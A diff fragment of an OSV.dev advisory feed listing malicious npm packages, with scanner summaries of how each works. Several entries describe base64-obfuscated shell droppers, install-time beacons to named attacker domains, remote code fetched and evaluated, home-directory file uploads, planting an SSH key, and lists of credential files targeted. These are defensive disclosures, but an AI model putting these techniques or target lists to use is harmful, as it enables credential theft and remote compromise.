+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in poly-utils (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-ffmg-f668-6cj8&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;poly-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (bad67795c6c211a5048719f791c96b16470f4954efcd7b3d450328ef4328d7a8)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-ffmg-f668-6cj8"&gt;https://github.com/advisories/GHSA-ffmg-f668-6cj8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6287"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6283: Malicious code in new-ecro-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6283</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6283"/>
+    <published>2026-06-23T12:15:37Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-85xv-pw78-4hqp"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-ecro-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-85xv-pw78-4hqp&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-ecro-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (b45cdcd40f43adb9955aa6a4be1c14e4b35bea9595514d5d96151e1858b755e1)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-85xv-pw78-4hqp"&gt;https://github.com/advisories/GHSA-85xv-pw78-4hqp&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6283"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6286: Malicious code in new-solt-1 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6286</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6286"/>
+    <published>2026-06-23T12:15:37Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-9jrq-rph3-6qqm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-solt-1 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-9jrq-rph3-6qqm&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-solt-1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (548ecaba7e63993f2d3c88cfb13098ae8b6c69161e2e748bd8b931dcbaec8c7b)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-9jrq-rph3-6qqm"&gt;https://github.com/advisories/GHSA-9jrq-rph3-6qqm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6286"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6281: Malicious code in libsignal-node-travatiger (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6281</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6281"/>
+    <published>2026-06-23T11:57:45Z</published>
+    <updated>2026-06-23T13:32:57Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-j2x4-j4hc-mvcv"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in libsignal-node-travatiger (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-j2x4-j4hc-mvcv&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;libsignal-node-travatiger&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (853bda071feb857da7ff2ecaa7809099b31dd181eed007bb9593b0e274e8a8be)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-j2x4-j4hc-mvcv"&gt;https://github.com/advisories/GHSA-j2x4-j4hc-mvcv&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6281"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6188: Malicious code in eslint-helper-1 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6188</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6188"/>
+    <published>2026-06-19T03:59:03Z</published>
+    <updated>2026-06-23T13:32:56Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-35c7-535m-jhv6"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in eslint-helper-1 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-35c7-535m-jhv6&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;eslint-helper-1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (cfadd6e70cf70ee03d7aae8bfcaa916d29073c5e09ca614bfcb4538c3efc1832)
+Package masquerades as an ESLint helper but contains code in index.js that decodes base64 blobs through Buffer.from(..., &amp;#x27;base64&amp;#x27;).toString() and pipes the resulting strings into execSync(&amp;#x27;bash...&amp;#x27;) and execSync(&amp;#x27;zsh...&amp;#x27;). This is the canonical obfuscated-shell-dropper shape: hidden payload bytes are reconstituted at runtime and handed to a shell interpreter, giving the author arbitrary command execution on the installer&amp;#x27;s machine. The name (eslint-helper-1) and lack of any legitimate ESLint integration are consistent with a typosquat / brand-impersonation lure for a credential-stealing or remote-execution payload.
+
+## Source: ghsa-mal…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/eslint-helper-1/v/5.0.4"&gt;https://www.npmjs.com/package/eslint-helper-1/v/5.0.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-35c7-535m-jhv6"&gt;https://github.com/advisories/GHSA-35c7-535m-jhv6&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6188"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6198: Malicious code in new-ecro-1 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6198</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6198"/>
+    <published>2026-06-19T05:20:04Z</published>
+    <updated>2026-06-23T13:32:56Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-j799-pq44-wq6g"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-ecro-1 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-j799-pq44-wq6g&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-ecro-1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (0c4e172aa83f2b8742fb014ea649490c87815573cab692ea74eb402ee23f935c)
+Package `new-ecro-1` impersonates the legitimate `big.js` library by shipping its source verbatim (banner, license, and homepage pointing at MikeMcl/big.js). Inside the load-time IIFE in both `big.js` and `big.mjs` at line 606, an injected block silently executes `const doc = require(&amp;quot;parket-slot&amp;quot;); doc.from_str().then(e =&amp;gt; {}).catch(e =&amp;gt; {})`, wrapped in a try/catch that swallows all errors. The `parket-slot` package is not declared in this manifest&amp;#x27;s `dependencies` (which instead lists `new-solt-1`), so the require resolves to whatever loader-controlled package happens to be present in the surrounding install tree, executing its `fro…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/new-ecro-1/v/0.3.9"&gt;https://www.npmjs.com/package/new-ecro-1/v/0.3.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/new-ecro-1/v/0.1.9"&gt;https://www.npmjs.com/package/new-ecro-1/v/0.1.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-j799-pq44-wq6g"&gt;https://github.com/advisories/GHSA-j799-pq44-wq6g&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6198"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6288: Malicious code in ts-numbering (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6288</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6288"/>
+    <published>2026-06-23T12:05:04Z</published>
+    <updated>2026-06-23T13:32:56Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-fvpj-9j2j-grmr"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-numbering (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fvpj-9j2j-grmr&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-numbering&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (eb07d5e37bf31a4dfe653c7c9634f145ad50c518ad9084c7fdbe893c9fe3da46)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fvpj-9j2j-grmr"&gt;https://github.com/advisories/GHSA-fvpj-9j2j-grmr&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6288"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6091: Malicious code in datacamp-light (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6091</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6091"/>
+    <published>2026-06-18T03:55:18Z</published>
+    <updated>2026-06-23T13:32:39Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-j27q-7263-hr46"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in datacamp-light (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-j27q-7263-hr46&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;datacamp-light&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (4dbdcc4ef12aca6461f8e765976a7b2b33099a1791a7aee7e353371b7954a91c)
+Package impersonates the DataCamp brand while shipping near-empty stub exports (index.js `init`/`helper` return trivial constants). The postinstall lifecycle hook (`node install.js`) runs on every `npm install` and collects the installer&amp;#x27;s hostname, OS username, home directory, platform, current working directory, and timestamp, then POSTs them over HTTPS to `dc.iam.c.noratomo.asia/install` with TLS certificate verification disabled (`rejectUnauthorized: false`). The destination domain has no relationship to datacamp.com. The combination of brand-impersonating name, hollow library functionality, lifecycle-triggered outbound beacon to a…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/datacamp-light/v/1.0.0"&gt;https://www.npmjs.com/package/datacamp-light/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-j27q-7263-hr46"&gt;https://github.com/advisories/GHSA-j27q-7263-hr46&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6091"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6220: Malicious code in chai-as-uphelded (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6220</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6220"/>
+    <published>2026-06-19T15:00:03Z</published>
+    <updated>2026-06-23T13:32:39Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-9gg4-phm5-h5g9"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in chai-as-uphelded (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-9gg4-phm5-h5g9&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;chai-as-uphelded&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (aa7f5470790594e55393048fee0e7a9e6e6650776a06717258e410292d4dc8a9)
+Package name impersonates the popular `chai-as-promised` library, but its package.json description and keywords masquerade as a pino-style logger and an unrelated vulnerability-management document — a deliberate metadata cover. The default export is an Express-style middleware that, when invoked, spawns a detached `node./lib/caller.js`. caller.js base64-decodes a URL to `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/a179ea35-b962-4722-b3f1-e28316d1a44a`, GETs JSON, and passes the response&amp;#x27;s `cookie` field directly to `new Function.constructor(&amp;#x27;require&amp;#x27;, s)(require)` — evaluating attacker-controlled JavaScript…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/chai-as-uphelded/v/6.11.4"&gt;https://www.npmjs.com/package/chai-as-uphelded/v/6.11.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-9gg4-phm5-h5g9"&gt;https://github.com/advisories/GHSA-9gg4-phm5-h5g9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6220"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6218: Malicious code in chai-as-attested (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6218</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6218"/>
+    <published>2026-06-19T15:00:12Z</published>
+    <updated>2026-06-23T13:32:39Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-v8fp-q6g9-vj9c"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in chai-as-attested (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-v8fp-q6g9-vj9c&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;chai-as-attested&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (88e27467366a90f482eb47476458b1f74d5a41ac63371572e527f2e60e4e0b51)
+Package impersonates a pino-style logger (exports `module.exports.pino`, ships pino-like `DEFAULT_LEVELS`, keywords `fast/logger/stream/json`) but the exported middleware spawns a detached `node lib/initializeCaller.js` that fetches a JSON document from a hardcoded free file-hosting URL (https://amethyst-lorrin-26.tiiny.site/index.json) and executes the `cookie` field of the response via `new Function.constructor(&amp;#x27;require&amp;#x27;, response)(require)`, granting the remote payload full Node `require` access. The endpoint URL and request headers are base64-encoded inside fake `process.env`-named constants and decoded at runtime with `atob` to ev…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/chai-as-attested/v/6.0.3"&gt;https://www.npmjs.com/package/chai-as-attested/v/6.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-v8fp-q6g9-vj9c"&gt;https://github.com/advisories/GHSA-v8fp-q6g9-vj9c&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6218"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[UPDATED] GHSA-547x-748v-vp6p: Dash apps vulnerable to Cross-site Scripting</title>
     <id>https://osv.dev/vulnerability/GHSA-547x-748v-vp6p</id>
@@ -61,22 +1230,6 @@ _-= Per source details. Do not edit below this line.=-_
 ## Source: ghsa-malware (80f8f93301656d6b3d3ed01546e0a32ffed7cce09b6e61442c1b31fe88b25dad)
 Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
 &lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6vr2-5hpq-589c"&gt;https://github.com/advisories/GHSA-6vr2-5hpq-589c&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6276"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6278: Malicious code in ts-wross (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6278</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6278"/>
-    <published>2026-06-23T06:22:06Z</published>
-    <updated>2026-06-23T07:46:21Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-53h7-mc3v-w73c"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-wross (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-53h7-mc3v-w73c&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-wross&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (f2ee248f4b7fad7f6a978fbc5f1accf635566ce61a3ee32f1353eba91bbe42d6)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-53h7-mc3v-w73c"&gt;https://github.com/advisories/GHSA-53h7-mc3v-w73c&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6278"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[NEW] MAL-2026-6271: Malicious code in node-fetch-utils (npm)</title>
@@ -152,22 +1305,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (91f23a964fca4e1984aecce2dbc51fc6bfa1ffe77725ee5f0e8d2f7a5c5514d8)
 node-slot 1.0.7 contacts https://datasecure-service.vercel.app/api/v1 to retrieve scan and block patterns, then walks the user&amp;#x27;s home directory (or non-C: drives on Windows) for files matching extensions such as.env,.json,.toml,.pdf,.docx and uploads them via multipart POST (axios.post(UPLOAD_URL, form,...) at index.js:78) along with the OS username and platform. On Linux it additionally fetches an attacker-supplied SSH public key from /api/ssh-key and appends it to ~/.ssh/authorized_keys (fs.appendFileSync(authKeys, sshKey + &amp;quot;\n&amp;quot;, { mode: 0o600 })), then runs `sudo ufw enable` and `sudo ufw allow 22/tcp` to ensure the operator can rea…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/node-slot/v/1.0.7"&gt;https://www.npmjs.com/package/node-slot/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-9243-vwcg-mpf3"&gt;https://github.com/advisories/GHSA-9243-vwcg-mpf3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6191"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-6277: Malicious code in search-from-search (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6277</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6277"/>
-    <published>2026-06-23T06:10:51Z</published>
-    <updated>2026-06-23T07:46:21Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-fgqv-2jmm-2p39"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in search-from-search (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fgqv-2jmm-2p39&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;search-from-search&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: ghsa-malware (52b06c1889c6a8622d50a998a9f4fe97d5baa626fb78c29c93550d15d21d2eba)
-Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
-&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fgqv-2jmm-2p39"&gt;https://github.com/advisories/GHSA-fgqv-2jmm-2p39&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6277"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[NEW] MAL-2026-6275: Malicious code in @ts-apis/ts-utils (npm)</title>
@@ -319,20 +1456,6 @@ const { id: userIdFromDb, display_name: displayName } =
 if (userIdFromDb == nu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg"&gt;https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/actualbudget/actual"&gt;https://github.com/actualbudget/actual&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-cq9c-6w48-qmfg"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-6274: Malicious code in web3-token-helper (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6274</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6274"/>
-    <published>2026-06-22T22:38:59Z</published>
-    <updated>2026-06-22T23:16:21Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in web3-token-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;web3-token-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (0c826bf782895b60580b94e3a28a2c4562d3742420ce81e9895ad8568da57890)
-The package advertises itself as a Web3 fee utility but its main export is a dropper. index.js line 140 base64-decodes a platform-specific command string and executes it via child_process.exec inside the exported calculateFee() function — the exact call the README documents as the headline usage example (`calculateFee(100, 2)`). The decoded commands branch on host OS and fetch attacker binaries from https://www.mythicalsgames.com/files/sean/ (a typosquat of the legitimate mythicalgames.com; the path segment `sean` matches package.json&amp;#x27;s `author: &amp;quot;sean&amp;quot;`): on Windows, PowerShell with `-W Hidden` downloads SvcHostUpdate.exe into the user…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.1.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.1.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.2.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.2.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.2.0"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.2.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.0.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.0.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.1.2"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.1.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6274"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[NEW] GHSA-v7j5-vc4m-723w: Budibase has an Account Impersonation Issue — Chat Identity Link Hijacking via Missing Consent &amp; CSRF</title>
     <id>https://osv.dev/vulnerability/GHSA-v7j5-vc4m-723w</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-v7j5-vc4m-723w"/>
@@ -460,20 +1583,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (75a12ea18e08fc325a5698f1da2246ffdfdaa4650971fa2b335fd0904e517079)
 The package is advertised as &amp;#x27;Shared UI constants and utilities&amp;#x27; but lib/index.js executes a malicious payload on require(). Sensitive strings (hostnames, paths, file targets) are obfuscated as numeric charcode arrays reassembled via String.fromCharCode to evade static scanners. After a randomized 0.5-2.5s delay, the module reads installer credentials from ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa, ~/.ssh/authorized_keys, ~/.ssh/config, ~/.aws/credentials, ~/.aws/config, ~/.kube/config, ~/.npmrc, ~/.netrc, ~/.docker/config.json, ~/.git-credentials, gcloud application-default credentials, gh hosts.yml, terraform credentials, Azu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@variational/common-ui/v/1.1.0"&gt;https://www.npmjs.com/package/@variational/common-ui/v/1.1.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a 